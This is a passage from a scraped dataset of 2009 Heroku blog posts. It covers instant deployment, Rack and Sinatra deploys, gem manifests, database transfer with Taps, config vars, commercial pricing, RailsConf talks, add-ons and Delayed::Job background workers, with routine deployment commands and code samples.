plug a lamp in anywhere is that hidden behind the walls, there’s a complex system of wiring, circuits, breakers, and transformers, which distribute power to the lamps evenly and only when needed, and prevent short circuits and other safety hazards. If one lamp has a short, it won’t destroy the other lamps or your home. Similarly, we need a platform architecture that can move apps around independently, start and stop them instantly, provide the standardized environment (library dependencies, databases, caching, etc.), distribute compute power evenly, and prevent one greedy or malfunctioning app from damaging others. 4. On-Demand Provisioning of Underlying Infrastructure Resources Lastly, no matter how many lamps you plug in (within reason), you won’t run out of power. The enormous capacity of electricity producers combined with a sophisticated grid of distribution and storage technologies ensure that power is available right when you need it. This whole system works because you don’t have to plug in a lamp and then wait for someone to turn on another generator somewhere. This last requirement is non-trivial, and has historically been a major barrier to instant provisioning/deployment. Thankfully it’s available now, in the form of utility computing from services like Amazon’s EC2. When compute power is needed, you can get it within seconds or minutes. It’s still not instant, but it’s close enough that an efficient dynamic platform can hide this delay by maintaining standby capacity (the same way batteries and capacitors hide the delay of a generator starting up on the electrical grid). This is the real value of utility computing: it has the power to enable truly instant provisioning and deployment, by providing one of the four requisites. Heroku’s Architecture We discovered the 4 requisites above as we built our platform, so our current architecture is designed specifically to address these issues.  Item 1 is embodied by our decision to specialize on Ruby-based web apps, and item 4 is simply available to us today for the first time. Items 2 and 3, however, deserve some explanation: 2. Standardization of App Structure The overall structure of our platform is designed to standardize the web stack, vastly simplifying the deployment process and removing a lot of decisions you might have to make when designing and deploying an app. Should we use memcached? It’s already included .  What about static content?  Don’t worry about it – our high-performance HTTP cache will handle it automatically.  How many app servers should we run, and how many machines do we need for them?  Just start with a few and change it instantly at any time , and never even think about how many servers they’re running on. We’ve also settled on a standard app stack we call a dyno . The way an app retrieves its configuration from the environment has also been standardized. 3. A Dynamic Platform We’ve done a huge amount of work on this over the last year, and our efforts have been focussed by the 25,000 apps now running on Heroku. The routing mesh gives us the ability to easily move apps around, and to scale our resources independently of scaling an individual app. The dyno grid lets us scale an app up , as well as distribute power evenly and route around problems . This architecture let’s you deploy via Git by simply pushing your code to your app’s Heroku repository.  We’re actually “compiling” your app now as it’s pushed; performing integrity checks and verifying that it can start. So did we get there?  Have we achieved instant deployment?  Well, we think we’re getting pretty damn close. philosophy architecture instant", "date": "2009-03-03,"},
{"website": "Heroku", "title": "Deploy Merb, Sinatra, or any Rack App to Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/32_deploy_merb_sinatra_or_any_rack_app_to_heroku", "abstract": "Deploy Merb, Sinatra, or any Rack App to Heroku Posted by Adam Wiggins March 05, 2009 Listen to this article The past eighteen months have seen an explosion of Rails-inspired Ruby web frameworks . Merb and Sinatra are the best known; plus many others such as Ramaze , Camping ,  and Waves . That’s why we’re so pleased to announce the ability to deploy any Rack-compatible web app to Heroku. Assuming you have a Heroku account , here’s how you can deploy a Sinatra app in about 30 seconds.  Make a new directory, and inside create hello.rb: require 'rubygems'\nrequire 'sinatra'\n\nget '/' do\n  \"Hello from Sinatra on Heroku!\"\nend Then create a config.ru file in the same directory (the location follows the Passenger convention ): require './hello'\nrun Sinatra::Application Now let’s put our microapp under revision control with Git: $ git init\nInitialized empty Git repository in /Users/adam/hello/.git/\n$ git add .\n$ git commit -m \"sinatra and heroku, two great tastes\"\n[master (root-commit)]: created 93a9e6d: \"sinatra and heroku, two great tastes\"\n 2 files changed, 9 insertions(+), 0 deletions(-)\n create mode 100644 config.ru\n create mode 100644 hello.rb Finally, create the app on Heroku and deploy: $ heroku create\nCreated http://severe-spring-77.heroku.com/ | git@heroku.com:severe-spring-77.git\nGit remote heroku added\n$ git push heroku master\nCounting objects: 4, done.\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (4/4), 385 bytes, done.\nTotal 4 (delta 0), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Verifying repository integrity... done, looks like a Rack app.\n       Compiled slug size is 0.1MB\n-----> Launching....... done\n       App deployed to Heroku\n\nTo git@heroku.com:severe-spring-77.git\n * [new branch]      master -> master Type “heroku open” at your shell (or cut-and-paste the web URL displayed when you created the app – in the example above it was http://severe-spring-77.heroku.com/).  Congratulations, you’re riding the Rack! For more details, including how to deploy other frameworks or even a frameworkless Rack app, check out the docs . newfeatures rack sinatra merb", "date": "2009-03-05,"},
{"website": "Heroku", "title": "Gem Manifests", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/gem_manifests", "abstract": "Gem Manifests Posted by Morten Bagai March 10, 2009 Listen to this article Gem installation and management has always been pain when the time comes to deploy an app. Rails 2.1 made good progress in this area with gem dependency specifications , allowing you to vendor required gems with a of set rake commands. That’s the method we’ve been recommending for Heroku apps until now, but it does leave important problems unsolved. First, a substantial limitation of the vendoring method is that it only works with pure Ruby gems. Many apps depend on gems with native extensions that need to be compiled on the deployment target.  It’s no good compiling a gem on your Mac laptop and trying to deploy the resulting binary to a Linux host. Then there’s the issue of adding extra bulk to your code repo by checking in vendored gems. Bulkier repos cause slower deploys, and slower usually equates to fewer. From a process perspective, the net result is decreasing the agility of your codebase. And in a cloud computing environment, these translate to direct scalability consequences: big repos don’t scale as fast as lean ones. A next-generation web host should have a next-generation solution to this problem.  Today we’re excited to introduce just such a solution: gem manifests, the new standard for gem installation and dependency management on Heroku! Here’s the skinny: add a file named “.gems” (this is your gem manifest) to the root of your app.  Here you can list your gems in a format identical to what you would pass to “gem install” on the command line: hpricot --version '>= 0.2' --source code.whytheluckystiff.net\ndm-core --version 0.9.10 Commit the file, git push to Heroku, and watch as your gems are fetched and installed. For Hpricot, native extensions are compiled before your very eyes! $ git add .gems\n$ git commit -m \"added gem manifest\"\n\n$ git push heroku master\nCounting objects: 4, done.\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 356 bytes, done.\nTotal 3 (delta 1), reused 0 (delta 0)\n\n-----> Heroku receiving push\n\n-----> Installing gem hpricot >= 0.2 from http://code.whytheluckystiff.net\n       Building native extensions.  This could take a while...\n       Successfully installed hpricot-0.6\n       1 gem installed\n\n-----> Installing gem dm-core 0.9.10 from http://gems.rubyforge.org\n       Successfully installed addressable-2.0.2\n       Successfully installed extlib-0.9.10\n       Successfully installed data_objects-0.9.11\n       Successfully installed dm-core-0.9.10\n       4 gems installed\n\n-----> Verifying repository integrity... done, looks like a Rails app.\n       Compiled slug size is 4.3MB\n-----> Launching.............. done\n       App deployed to Heroku\n\nTo git@heroku.com:vivid-moon-60.git\n   91425e3..fe10e87  master -> master As you can see, this gem manifest is lightweight, framework-agnostic (works great with Sinatra), and won’t add any weight to your repo since installation is done in the cloud.  Your gems are automatically in the require path, so you can pull them into your app easy-as-pie. Finally, gems are only compiled when the manifest changes, so subsequent deploys will be fast as ever. Check out the docs , take it for a test-drive, and tell us what you think. gems", "date": "2009-03-10,"},
{"website": "Heroku", "title": "Rails 2.3", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/rails_23", "abstract": "Rails 2.3 Posted by Morten Bagai March 16, 2009 Listen to this article The Rails 2.3.2 gem is now installed and available for use on Heroku. To learn more about what’s new and improved, check the official Rails blog post . Enjoy! rails gems", "date": "2009-03-16,"},
{"website": "Heroku", "title": "Push and Pull Databases To and From Heroku", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/push_and_pull_databases_to_and_from_heroku", "abstract": "Push and Pull Databases To and From Heroku Posted by Morten Bagai March 18, 2009 Listen to this article Warning: This feature is deprecated; please use pg:pull instead. A frequent question people ask us is “how do I transfer my database between my local workstation and my Heroku app?” This is an important question for several reasons. First, you always own your data on Heroku, and we want you to be able to get to it quickly and easily at any time. Also – as you may have noticed from previous posts – we’re obsessive about workflow. Whether you’re debugging an issue with production data or setting up a staging environment, being able to quickly pull/push data between environments is key to a smooth experience. Previously, we offered yaml_db as a solution. We liked that it was simple and database agnostic, but parsing large YAML files is just too slow. We also wanted something that works with any framework compatible with our Rack-based platform .  Ricardo, Blake and Adam came up with Taps , which was released last month as a standalone project . Having collected some quality feedback from the community, we’re now pleased to announce that Taps is officially baked into Heroku , allowing seamless and easy database transfer between Heroku apps and any external environment. To try it out, install the latest Heroku gem. Then use the “db:pull” command to pull your database down from your Heroku app to your local workstation: $ heroku db:pull\nReceiving schema\nReceiving data\n8 tables, 591 records\nusers:         100% |================================| Time: 00:00:00\npages:         100% |================================| Time: 00:00:00\ncomments:      100% |================================| Time: 00:00:00\ntags:          100% |================================| Time: 00:00:00\nReceiving indexes\nResetting sequences This loads the schema, data, indexes and sequences of the remote Heroku database down into the local database specified in config/database.yml. You can also specify the destination database using standard URI -syntax: $ heroku db:pull mysql://root:mypass@localhost/mydb Because Taps uses ActiveRecord (for schema) and Sequel (for data), it seamlessly transfers between different database vendors. In fact, if you don’t feel like running a local database server, just use SQLite: $ heroku db:pull sqlite://path/to/my.db Of course, the syntax for pushing your local database up to Heroku is equally simple: $ heroku db:push\nSending schema\nSending data\nusers:         100% |================================| Time: 00:00:00\npages:         100% |================================| Time: 00:00:00\ncomments:      100% |================================| Time: 00:00:00\ntags:          100% |================================| Time: 00:00:00\nSending indexes\nResetting sequences That’s Taps in a nutshell. It’s live right now, so check it out and let us know how you like it. Full docs are available here .", "date": "2009-03-18,"},
{"website": "Heroku", "title": "Radiant CMS in 5 Minutes Or Less", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/radiant_cms_in_5_minutes_or_less", "abstract": "Radiant CMS in 5 Minutes Or Less Posted by Morten Bagai March 26, 2009 Listen to this article Radiant is an excellent Rails-based Content Management System ( CMS ). It was created by John W. Long and Sean Cribbs, and has been around for a couple of years, growing steadily in popularity. With the recent addition of taps and gem manifests , it’s super-easy to get this lightweight CMS up and running on Heroku. Start by installing the latest radiant gem on your local box: $ sudo gem install radiant Now use the radiant command-line tool to set up your Radiant CMS locally. We’ll use SQLite as the local database: $ radiant --database sqlite mycms\n$ cd mycms\n$ rake db:bootstrap Before we can push to Heroku, we’ll need to initialize a git repo in our project directory: $ git init By default, Radiant caches CMS pages in RAILS_ROOT/cache. This won’t work with Heroku’s read-only file system , so before deploying we’ll change it to make sure cached files are written in the tmp directory. Open up your config/environment.rb, and change the cache config line so it reads: config.action_controller.page_cache_directory = \"#{RAILS_ROOT}/tmp/cache\" We’ll also add a gem manifest to make sure the radiant gem is installed on Heroku when we push. Radiant depends on rSpec 1.2.2, so our .gems file should look like this: rspec --version 1.2.2\nradiant --version 0.7.1 Then commit your changes: $ git add .\n$ git commit -m \"changed cache dir and added gem manifest\" Now it’s time to create an app on Heroku and deploy this baby to it. $ heroku create\nCreated http://vivid-fog-54.heroku.com/ | git@heroku.com:vivid-fog-54.git\nGit remote heroku added\n$ git push heroku master\n....\n-----> Heroku receiving push\n-----> Rails app detected\n       Compiled slug size is 5.4MB\n-----> Launching.......... done\n       App deployed to Heroku Finally, we’ll transfer over our local database using taps : $ heroku db:push\nAuto-detected local database: sqlite://db/development.sqlite3\nSending schema\nSending data\n9 tables, 57 records\nschema_migrat: 100% |==================| Time: 00:00:00\nconfig:        100% |==================| Time: 00:00:00\npage_parts:    100% |==================| Time: 00:00:00\nextension_met: 100% |==================| Time: 00:00:00\nsessions:      100% |==================| Time: 00:00:00\npages:         100% |==================| Time: 00:00:00\nsnippets:      100% |==================| Time: 00:00:00\nlayouts:       100% |==================| Time: 00:00:00\nusers:         100% |==================| Time: 00:00:00\nSending indexes And now our Radiant instance is live and ready to go! gems radiant", "date": "2009-03-26,"},
{"website": "Heroku", "title": "Heroku at RailsConf", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/heroku_at_railsconf", "abstract": "Heroku at RailsConf Posted by Morten Bagai March 30, 2009 Listen to this article Heroku is gearing up for RailsConf 09 in Las Vegas, and just like last year, we’ve got a sweet line-up for y’all… Kicking things off on Monday , Sinatra co-creator Blake Mizerany will be hosting an in-depth tutorial on the the micro-framework that’s sweeping the Ruby nation right now. Continuing in a similarly minimalistic vein on Wednesday , Adam Wiggins will lend his considerable Rack-fu to a talk showcasing Rails Metal – the hot new feature in Rails 2.3 that lets you build Rack endpoints for selected URLs that bypass Routes and ActionController for a massive speed boost. Heck, he’ll even show you how to use Sinatra inside your existing Rails app! Finally, we’ve put together a massively kick-ass panel about The Future of Deployment . At Heroku we’ve put an immense amount of research into building the ideal Ruby stack based on open-source standard components. This event will be a unique opportunity to discuss every part of it in detail. Joining key members of the Heroku team will be Marc-Andre Cournoyer , creator of Thin and Christian Neukirchen , creator of Rack. We can’t stress enough just how freakin’ excited we are to have these guys join us for what should be a highlight of the conference. In addition to these talks, Heroku will be present in full force at RailsConf, and we’ll be announcing more details about that as the date grows closer. This is definitely the event in the Ruby community, and we hope to see you there. If you haven’t registered yet, hurry on over to the RailsConf website , and use the code “RC09FOS” for a 15% discount. railsconf", "date": "2009-03-30,"},
{"website": "Heroku", "title": "Fork Our Docs", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/fork_our_docs", "abstract": "Fork Our Docs Posted by Adam Wiggins April 01, 2009 Listen to this article Heroku is now sporting an updated docs layout at docs.heroku.com .  These new docs should be much easier to navigate and link to. We built this as a standalone Sinatra app serving Markdown files, partially inspired by Assaf Arkin’s approach to Buildr .  It uses Cache-Control with a long max-age, to take advantage of the Varnish http cache which fronts all Heroku apps .  This makes it as snappy as staticly rendered pages, while retaining the flexibility of a dynamic app on the backend. The docs app is deployed as a regular app on Heroku (just like this blog ).  Nothing special-case here: we deploy with git push, just like any other Heroku user. Dogfooding is good for you. The app’s source is on Github .  Fork and send us a pull request if you want to make edits to improve the wording, fix a typo, or even add a whole new section. Watch the repo to keep an eye on new additions to the docs.  Or fork and use the code as the basis for your own docs app (though we ask that you not use our images or colorscheme). Let’s also take a moment to give a nod to AsciiDoc , which we’ve been using for our docs up until now.  Although it didn’t turn out to be a long-term solution as a docs CMS , it was a great way to get off the ground.  We highly recommend it to anyone looking for an easy way to get good-looking HTML docs generated from a simple and intuitive markdown format. docs opensource", "date": "2009-04-01,"},
{"website": "Heroku", "title": "Config Vars for Deploy-Specific Settings", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/config-vars", "abstract": "Config Vars for Deploy-Specific Settings Posted by Adam Wiggins April 07, 2009 Listen to this article Say you’re working on a Rails app, and you want to publish your code on Github.  Most apps have some deploy-specific private config values – for example, if you’re using the S3 storage back-end for Paperclip , and your S3 keys are saved in config/amazon_keys.yml.  You certainly don’t want to push those up to Github – what to do? You could maintain a separate deploy branch, and commit your deploy config only to that.  You can then work on the main branch, and rebase the deploy branch whenever you go for a deploy.  That’s a bit of extra work you could do without, though – and you know sooner or later, you’re going to accidentally push the wrong branch to Github, putting your S3 keys up for the whole world to see.  Oops. Wouldn’t it be nice avoid all this headache by storing the data specific to your app’s deploy in a separate configuration registry? Now you can.  Check it out: $ heroku config:add S3_BUCKET=mybucket S3_KEY=8N029N81 S3_SECRET=9s83109d3+583493190\nAdding config vars:\n  S3_BUCKET => mybucket\n  S3_KEY    => 8N029N81\n  S3_SECRET => 9s83109d3+583493190\nRestarting app...done. Your config vars are now accessible in the environment variables for your deployed app.  Configure Paperclip like this: has_attached_file :photo,\n  :storage => :s3,\n  :s3_credentials => {\n    :access_key_id => ENV['S3_KEY'],\n    :secret_access_key => ENV['S3_SECRET']\n  },\n  :bucket => ENV['S3_BUCKET'],\n  :path => \":attachment/:id\" Set up like this, your public code and your deployed code can be exactly the same.  Push to Github all day long with no fear of leaking your private credentials.  Clean and neat, no fuss, no muss. This also means you can set different config vars for different deployed versions of the app.  For example, if you run a staging deploy of your code on Heroku, you can set it to use a different S3 bucket – maybe “myapp_assets” for production and “myapp_staging_assets” for staging. What about running locally, deploying to a traditional host?  Since these are just environment variables, you can set them just as you normally would – in your .bashrc (export S3_BUCKET=mybucket), or on the command line when you run the server. Or, you can check for the presence of the vars, and use defaults when they don’t exist.  In the case of Paperclip, you might do: has_attached_file :photo,\n  :storage => ENV['S3_BUCKET'] ? :s3 : :filesystem,\n  ... Now when you run locally, it’ll use the filesystem store; but running on a deployed app with the S3_BUCKET var set, it’ll automatically go to the right place. There are many other uses for config vars.  For example, you can set RACK_ENV to something other than the default of ‘production’.  (RAILS_ENV and MERB_ENV will automatically mirror RACK_ENV on Heroku.)  So if you prefer the traditional approach of storing different keys for different environments (development/staging/production) in various config/something.yml files, set your RACK_ENV as appropriate for your staging and production deployed apps on Heroku. Read the full documentation .  Note that you’ll need to grab the 0.7 Heroku client gem (it’s in Rubyforge now, so `gem install heroku` will do the trick) to use this feature. newfeatures", "date": "2009-04-07,"},
{"website": "Heroku", "title": "Commercial Launch", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/commercial_launch", "abstract": "Commercial Launch Posted by James Lindenbaum April 23, 2009 Listen to this article When Adam, Orion, and I started Heroku two years ago, we had no idea how much new technology we would have to build to realize our vision of an instant platform for Ruby that just works . Luckily, we were able to attract an amazing team to work on this problem with us, and the team has really shaped Heroku into the offering it is today.  We’re currently by far the fastest and easiest deployment platform for Ruby, and we’ve gotten great feedback on our provisionless hosting architecture . We have over 25,000 apps running on the platform today, and many of our users have been asking for pricing and paid services for some time now.  So today we’re pleased to announce that we are officially out of beta and available for commercial use. Detailed pricing information is now available . Dynos As discussed previously , our system is built around a dyno grid that allows us to deploy your app just by pushing your code, and to scale it up and down instantly.  Your app runs inside this grid in any number of dynos . The number of dynos you run directly affects the concurrency and therefore the performance of your app, so our pricing is based around this same concept.  The first dyno for an app is always free, and additional dynos will be billed at $0.05 per dyno-hour. Play with the dyno slider on our pricing page to estimate your bill. You can scale your dynos up and down instantly at any time via the web interface, our API , or our command-line gem. Database At the database layer , we have two categories of options.  We offer a shared database cluster in three storage sizes.  The smallest size is free, and you can upgrade/downgrade between options instantly at any time. For more serious needs, we also offer three dedicated database plans, ranging from small to large in compute and storage levels.  These can also be changed at any time, but resizing requires a few moments of downtime. Add-ons We’re also officially launching some add-on features.  Some of these features, like backups and more frequent cron tasks are paid features.  Others, like custom domains and SSL are free, but require you to enter your billing information as an abuse protection measure ( more info ). There is a lot more to come – you can get a preview by checking out the beta features in the add-ons section. Free Service It’s important to us to continue to provide a free service tier, useful enough to get started with Heroku.  This is still available, and is the default for new apps with a single free dyno and free shared database. This free tier is well suited for rapid-prototyping, staging, and testing purposes, as well as actually running lightweight apps. Pricing and paid-features are being rolled out in phases across our user base.  It may take a few days for commercial service to be activated for all accounts. The official press release is available here . news", "date": "2009-04-23,"},
{"website": "Heroku", "title": "New Heroku Screencast by Remi", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/new_heroku_screencast_by_remi", "abstract": "New Heroku Screencast by Remi Posted by Morten Bagai April 30, 2009 Listen to this article It’s been a bit of a blur here at Heroku HQ in the past couple of weeks. However, amidst all the launch activity we did notice a screencast so sweet we thought we’d share it with you . It really covers the whole platform exceptionally well, and we particularly dig how it manages to show off both Rails and Rack app deployment. Big ups to Remi for putting this together, and way to shame us for not getting any official screencasts together for the new and improved Heroku.  :) screencasts", "date": "2009-04-30,"},
{"website": "Heroku", "title": "RailsConf Schedule", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/railsconf_schedule", "abstract": "RailsConf Schedule Posted by James Lindenbaum May 03, 2009 Listen to this article RailsConf starts tomorrow and Heroku will be there in full force.  Here’s our line up: Monday, 1:30pm — A Hat Full of Tricks with Sinatra Our very own Blake Mizerany, the creator of Sinatra, is giving a tutorial on Sinatra.  Ryan Tomayko will be on hand as well. Tuesday, 1:50pm — The Future of Deployment: A Killer Panel Join me as I moderate a panel on deployment, with a truly killer group:  Marc-André Cournoyer (creator of Thin), Christian Neukirchen (creator of Rack), Ryan Tomayko (Rack core team, creator of Rack::Cache, Sinatra core team), Blake Mizerany (creator of Sinatra), and Adam Wiggins (Heroku cofounder, creator of RestClient, Rush, and many others). Wednesday, 10:45am — Rails Metal, Rack, and Sinatra Adam will be giving a great talk on the latest and greatest about Rack, Rails Metal, multiple Rack endpoints, and even a bit of Sinatra.  The patterns and methods he’ll discuss are the latest in scalable architecture best practices for Ruby apps. Wednesday, 2:50pm — Heroku: Guided Tour and Q & A Most of the Heroku team will be on hand to walk you through the Heroku platform, show off some new features, and answer questions. Thursday, 9:25am — HTTP’s Best-Kept Secret: Caching Ryan Tomayko will be giving a talk on what’s probably the most important issue in Rails right now: HTTP caching.  This extremely powerful, transparent, and easy to implement technology is badly misunderstood and misused today.  Ryan has been on the front lines for a long time, and is truly an expert; you’re bound to come out of this talk with a new, inspired perspective on HTTP caching. Exhibit Hall — Heroku Booth Once again we’ve got a big booth in the exhibit hall, where we’ll be demoing new features, answering questions, and giving out schwag.  The Heroku team heavyweights will be available to answer your questions and help you sort out issues with your individual apps, or to just do some hacking.  We’ll also be giving out t-shirts, stickers, and free credits for Heroku paid-services. news", "date": "2009-05-03,"},
{"website": "Heroku", "title": "Add-on: Wildcard Domains", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/add_on_wildcard_domains", "abstract": "Add-on: Wildcard Domains Posted by Morten Bagai May 27, 2009 Listen to this article Since we returned from a fun and successful Railsconf in Vegas , we have been in full swing completing the rollout of our paid services. The response has been enormous so far, and paid services are now available to all users. If you’ve checked out the pricing page , you’ve undoubtedly noticed our line-up of a la carte add-ons . We’re really excited about add-ons becoming a key part of our platform, allowing us to seamlessly deliver popular application services and components with the built-in scalability and ease of use you’ve come to expect from Heroku. We’ve had a solid first batch of add-ons in beta for a while, and today we’re happy to announce the first graduate: Wildcard Domains , which allows your app to respond on *.yourdomain.com. Since we started supporting custom domains on Heroku this has been high on the list of requested features, and now it’s here! To add it to your app for $5/month, simply go to your app’s Resources page and select turn it on. Enjoy! newfeatures", "date": "2009-05-27,"},
{"website": "Heroku", "title": "Pimp Your Cart: Shopify Apps on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/shopify_apps", "abstract": "Pimp Your Cart: Shopify Apps on Heroku Posted by Adam Wiggins June 11, 2009 Listen to this article Our good friends at Shopify recently released a developer platform which makes it crazy easy to build custom functionality into an e-commerce store using a standalone Rails app.  There are already some great apps available in their app store , many of which are running on Heroku.  (The shopify.com homepage also now lives here .) Check out the excellent getting started video by James MacAulay.  It shows just how slick the Shopify API is – these guys are really taking e-commerce to the next level.  (And bonus points for use of config vars to store API keys!) news", "date": "2009-06-11,"},
{"website": "Heroku", "title": "Railslab Interview", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/railslab_interview", "abstract": "Railslab Interview Posted by Morten Bagai July 01, 2009 Listen to this article Railslab is a great site by our friends over at New Relic that contains a wealth of knowledge on Rails scaling and application performance. A couple of weeks ago they asked Ryan and Adam to stop by for a discussion of the vision behind Heroku, and the philosophy that drives the design and buildout of our scalable, provisionless hosting platform . The interview is now available for your viewing pleasure in three parts. In the first part Adam goes into detail about the core vision behind the concept of instant deployment, and how Heroku is committed to making the deployment of Ruby web apps a seamless extension of an agile development workflow. In the second part Ryan and Adam discuss how scalability  and performance really emerge from a strong focus on understanding and implementing the correct solution to common application design problems. This goes straight to the essence of what we like to call stack curation. By providing a fully managed, state-of-the-art application stack we aim to replace the hurdles of tedious configuration and maintenance that often keep developers from doing things the right way with the first truly provisionless hosting environment. With Heroku, we’re not just looking to make correct design possible – we’re looking to make it so easy that it’d be downright shameful not to :) Finally, the guys discuss some of the tools & services they use in their daily work, and what they think is important to have in your arsenal to really inform your development work – especially in a cloud computing environment. Whether you’re just curious about Heroku , or an existing user there’s a lot of great information about our platform in these interviews, and we hope you’ll check them out. Big thanks to the guys over at New Relic for yanking Ryan & Adam away from their respective keyboards long enough to get this on tape! railslab new relic", "date": "2009-07-01,"},
{"website": "Heroku", "title": "Develop a Voice App with Twilio + Heroku, Win a Netbook", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/twilio_developer_contest", "abstract": "Develop a Voice App with Twilio + Heroku, Win a Netbook Posted by Morten Bagai July 06, 2009 Listen to this article Not too long ago building telephony apps, such as interactive voice response systems, was far out of reach for most web developers. Now, an exciting crop of new startups is rapidly changing that, making it easy to incorporate voice capabilities into any web app, or even build standalone voice apps. Twilio is emerging as one the leading companies in this area, offering a a REST API for building voice apps. The model is simple: sign up for a number with Twilio.  When a call comes in, Twilio makes an HTTP request to URL of your choice, containing information about the phone call. The processing logic resides entirely inside your web app, and instructions are passed back and forth using XML . To help kick off this new era of voice-enabled applications, Heroku is co-sponsoring this week’s edition of Twilio’s Developer Contest . The rules are simple – develop a Twilio app in Ruby, deploy it to Heroku and submit your entry by midnight on July 13th . The lucky winner gets a netbook and $300 in Heroku platform credit to spend on dynos, database, or add-ons. This page has all the info you need , including links to example code on Github and a screencast showing how it works.  We look forward to seeing the entries! twilio", "date": "2009-07-06,"},
{"website": "Heroku", "title": "And the winner is... Michael Ansel!", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/and_the_winner_is_michael_ansel", "abstract": "And the winner is... Michael Ansel! Posted by Morten Bagai July 13, 2009 Listen to this article Congratulations to Michael who’s the winner of our Heroku+Twilio Developer contest . Michael got seriously busy, and submitted not one but two projects for the contest! The first is a handy app that tells students, faculty, employees, and visitors at Duke University which places on campus are currently open. Simply call in, and it’ll read you back a list of open restaurants, libraries etc. There’s even a keypad-based search option. Seriously cool stuff! You can try it on the Twilio sandbox by calling (866) 583-6913 and entering 4456-8772 when prompted for a PIN . If that wasn’t enough, Michael also hammered out a suite of Ruby development tools for Twilio, including a TwiML Response libary, a TwiMl parser and a web based call simulator. All very impressive work, and available for you to use on Github . Michael, we hope you’ll enjoy your spiffy new Netbook and $300 in Heroku platform credit. You truly deserve it! Last but not least, a big thanks goes out to everyone who played in the contest – keep building cool stuff! twilio", "date": "2009-07-13,"},
{"website": "Heroku", "title": "Background Jobs with DJ on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/background_jobs_with_dj_on_heroku", "abstract": "Background Jobs with DJ on Heroku Posted by Adam Wiggins July 15, 2009 Listen to this article Our goal for the Heroku platform has been to create a totally smooth and seamless experience for getting your Ruby web application online.  Web apps revolve around one or more dynamic web processes: what Rubyists often call a mongrel, and what we call a dyno .  When it comes to dynos, we think we’ve really nailed it, and nothing makes that more tangible than the ease of scaling your app with the dyno slider . But most serious web apps have a second aspect: one that gets less attention, but one that is often just as important as the web process.  Like the dark side of the moon, this second half of your application is not directly visible to users, but without it the app would not be whole.  This aspect of the application is often referred to as background jobs.  The processes which handle background jobs are called workers. A worker is used for any heavy lifting your app needs to do.  Some examples include: sending email, accessing a remote API (like posting something to Twitter), fetching posts from an RSS feed, converting an image thumbnail, or rendering a PDF .  Anything that will take more than 100ms should go in a worker process, not your web process. Ad-hoc Background Jobs There are many ways to create worker processes that run asynchronously from your web requests.  Examples include forking a web process, or running a cron job every minute to check for work.  Those ad-hoc techniques work ok in some situations, but they not highly maintainable or scalable.  At Heroku, we don’t want to do something unless we can do it right.  We want our workers to be as smooth, powerful, scalable, and easy to use as our dynos. Background Jobs Done Right Worker processes on Heroku run completely independently of your dynos.  They can be scaled out horizontally across our grid of instances to any size, independent of the number of dynos you’re running.  (Some apps need more concurrency for the web front, some for the background workers – scaling the two should be orthogonal.) One way to describe a mongrel or dyno is as a share-nothing process that consumes web requests.  Likewise, a worker can be described as a share-nothing process that consumes jobs from a work queue. Work Queues Work queues are currently an area of academic debate among thought leaders in the Ruby community.  Work queues consist of two parts: a queueing system and a message bus.  The message bus may be an implementation of a messaging standard, or a custom protocol. Some examples of queueing systems include: Delayed::Job , Workling , BJ , and Starling . Some examples of message buses include: RabbitMQ (implementing the AMQP protocol), Beanstalkd , Amazon SQS , and Kestrel . These are some great tools, many of which are in production use by major Ruby sites.  For example, Twitter uses Kestrel, while Scribd uses loops and ActiveMQ .  But when the largest Rails sites in the world don’t have a consensus on the best tool for the job, what should the rest of us be using? Luckily, there’s an excellent solution for medium-sized apps that has been quietly gaining momentum in the Rails world.  That solution is Delayed::Job . Delayed Job DJ is an easy-as-pie plugin for Rails written by Tobias Lütke.  (It can be used with Sinatra , too).  It uses the database as a message bus instead of an external daemon.  Using the database as the message bus isn’t as high-speed or featureful as a dedicated daemon like RabbitMQ, but it’s easier to set up, and more than enough for most sites – including Github . John Nunemaker has an excellent tutorial on DJ , and I’ve previously illustrated the steps for building a queue-backed feed reader .  So there’s plenty of material to get you going with this plugin. DJ on Heroku We’re pleased to announce the first iteration of support for background jobs on Heroku, in the form of DJ support.  This has been in heavy beta use by a large group of Heroku beta users (thanks guys!) for the last four months, so we feel very confident that this is a solid solution, ready for real production use today. Our first publicly-priced offering is a single DJ worker, at $15/mo.  You can activate it for your app through the usual add-on interface: $ heroku addons:add dj\nAdding dj to myapp...done. Follow the instructions for installing the DJ plugin and creating the delayed_jobs table, and you’ll be up and running in minutes.  (That’s the smooth, seamless experience you’ve come to expect from Heroku.) More to Come If you need something beyond the publicly-priced single worker DJ, contact us.  Multi-worker setup, and a more powerful message bus (RabbitMQ) are things we already have in late alpha / early beta status.  If you’ve got an app that you think can put these technologies to the test, we’d love to hear from you. newfeatures", "date": "2009-07-15,"},
